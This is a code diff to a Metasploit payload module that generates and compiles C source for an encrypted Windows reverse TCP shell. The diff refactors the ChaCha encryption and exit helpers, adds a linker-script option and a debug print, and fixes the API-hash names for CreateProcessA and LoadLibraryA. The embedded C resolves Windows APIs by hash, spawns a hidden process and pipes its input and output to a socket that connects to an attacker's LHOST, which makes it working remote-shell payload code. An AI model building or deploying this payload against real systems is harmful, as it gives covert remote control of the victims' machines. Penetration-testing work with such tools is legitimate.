@@ -15,7 +15,7 @@ module Payload::Windows::EncryptedReverseTcp
 
   include Msf::Payload::Windows
   include Msf::Payload::Single
-  include Msf::Payload::Windows::EncryptedReverseTcpOpts
+  include Msf::Payload::Windows::EncryptedPayloadOpts
 
   def initialize(*args)
     super
@@ -26,7 +26,7 @@ module Payload::Windows::EncryptedReverseTcp
     {
       call_wsastartup: datastore['CallWSAStartup'],
       port:            format_ds_opt(datastore['LPORT']),
-      host:            format_ds_opt(datastore['LHOST']) || ''
+      host:            format_ds_opt(datastore['LHOST'])
     }
 
     # c source code must be generated first,
@@ -36,9 +36,11 @@ module Payload::Windows::EncryptedReverseTcp
     compile_opts =
     {
       strip_symbols: datastore['StripSymbols'],
+      linker_script: datastore['LinkerScript'],
       arch:          self.arch_to_s
     }
 
+    puts src
     Metasploit::Framework::Compiler::Mingw.compile_c(src, compile_opts)
     src
   end
@@ -46,6 +48,8 @@ module Payload::Windows::EncryptedReverseTcp
   def generate_c_src(conf)
     src = headers
     src << chacha_key
+    src << chacha_func
+    src << exit_proc
 
     if conf[:call_wsastartup]
       src << init_winsock
@@ -71,7 +75,7 @@ module Payload::Windows::EncryptedReverseTcp
 
     opt = opt.to_s
     opt.split('').each { |elem| modified << "\'#{elem}\', " }
-    modified = "#{modified} 0"
+    modified = "#{modified}0"
   end
 
   def headers
@@ -88,6 +92,40 @@ module Payload::Windows::EncryptedReverseTcp
     %Q^
       #define KEY     "HKa1Rt3KdxCf35I3kS1RUGh6MXSfqEC4"
       #define NONCE   "bCsEzT3QbCsE"
+    ^
+  end
+
+  def chacha_func
+    %Q^
+      char *chacha_data(char *buf, int len)
+      {
+        chacha_ctx ctx;
+        chacha_keysetup(&ctx, KEY, 256, 96);
+        chacha_ivsetup(&ctx, NONCE);
+
+        FuncGlobalAlloc GlobalAlloc = (FuncGlobalAlloc) GetProcAddressWithHash(#{get_hash('kernel32.dll', 'GlobalAlloc')}); // hash('kernel32.dll', 'GlobalAlloc') -> 0x520f76f6
+        char *out = GlobalAlloc(GMEM_FIXED, sizeof(char) * (len + 1));
+        chacha_encrypt_bytes(&ctx, buf, out, len);
+        out[len] = '\\0';
+
+        return out;
+      }
+    ^
+  end
+
+  def exit_proc
+    %Q^
+      UINT ExitProc()
+      {
+        DWORD term_status;
+        FuncGetCurrentProcess GetCurrentProcess = (FuncGetCurrentProcess) GetProcAddressWithHash(#{get_hash('kernel32.dll', 'GetCurrentProcess')}); // hash('kernel32.dll', 'GetCurrentProcess') -> 0x51e2f352
+        FuncGetExitCodeProcess GetExitCodeProcess = (FuncGetExitCodeProcess) GetProcAddressWithHash(#{get_hash('kernel32.dll', 'GetExitCodeProcess')}); // hash('kernel32.dll', 'GetExitCodeProcess' -> 0xee54785f
+
+        HANDLE curr_proc_handle = GetCurrentProcess();
+        GetExitCodeProcess(curr_proc_handle, &term_status);
+
+        return term_status;
+      }
     ^
   end
 
@@ -112,32 +150,6 @@ module Payload::Windows::EncryptedReverseTcp
 
   def comm_setup
     %Q^
-      char *chacha_data(char *buf, int len)
-      {
-        chacha_ctx ctx;
-        chacha_keysetup(&ctx, KEY, 256, 96);
-        chacha_ivsetup(&ctx, NONCE);
-
-        FuncGlobalAlloc GlobalAlloc = (FuncGlobalAlloc) GetProcAddressWithHash(#{get_hash('kernel32.dll', 'GlobalAlloc')}); // hash('kernel32.dll', 'GlobalAlloc') -> 0x520f76f6
-        char *out = GlobalAlloc(GMEM_FIXED, sizeof(char) * (len + 1));
-        chacha_encrypt_bytes(&ctx, buf, out, len);
-        out[len] = '\0';
-
-        return out;
-      }
-
-      UINT ExitProc()
-      {
-        DWORD term_status;
-        FuncGetCurrentProcess GetCurrentProcess = (FuncGetCurrentProcess) GetProcAddressWithHash(#{get_hash('kernel32.dll', 'GetCurrentProcess')}); // hash('kernel32.dll', 'GetCurrentProcess') -> 0x51e2f352
-        FuncGetExitCodeProcess GetExitCodeProcess = (FuncGetExitCodeProcess) GetProcAddressWithHash(#{get_hash('kernel32.dll', 'GetExitCodeProcess')}); // hash('kernel32.dll', 'GetExitCodeProcess' -> 0xee54785f
-
-        HANDLE curr_proc_handle = GetCurrentProcess();
-        GetExitCodeProcess(curr_proc_handle, &term_status);
-
-        return term_status;
-      }
-
       struct addrinfo *conn_info_setup(char *i, char *p)
       {
         UINT term_proc_stat = ExitProc();
@@ -197,7 +209,7 @@ module Payload::Windows::EncryptedReverseTcp
         si.hStdError = si.hStdOutput = out_wr;
         si.hStdInput = in_rd;
 
-        FuncCreateProcess CreateProcess = (FuncCreateProcess) GetProcAddressWithHash(#{get_hash('kernel32.dll', 'CreateProcess')}); // hash('kernel32.dll', 'CreateProcess') -> 0x863fcc79
+        FuncCreateProcess CreateProcess = (FuncCreateProcess) GetProcAddressWithHash(#{get_hash('kernel32.dll', 'CreateProcessA')}); // hash('kernel32.dll', 'CreateProcess') -> 0x863fcc79
         if(!CreateProcess(NULL, cmd, &sa, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi))
         {
           ExitProcess(proc_stat);
@@ -289,16 +301,14 @@ module Payload::Windows::EncryptedReverseTcp
         char ws2[] = { 'w', 's', '2', '_', '3', '2', '.', 'd', 'l', 'l', 0 };
 
         // first get address of loadlibrary
-        LoadALibrary = (FuncLoadLibraryA) GetProcAddressWithHash(#{get_hash('kernel32.dll', 'LoadLibrary')}); // hash('kernel32.dll', 'LoadLibrary') -> 0x0726774C
+        LoadALibrary = (FuncLoadLibraryA) GetProcAddressWithHash(#{get_hash('kernel32.dll', 'LoadLibraryA')}); // hash('kernel32.dll', 'LoadLibrary') -> 0x0726774C
         LoadALibrary((LPTSTR) ws2);
       ^
   end
 
   def call_init_winsock
     %Q^
-
         init_winsock();
-
     ^
   end
 
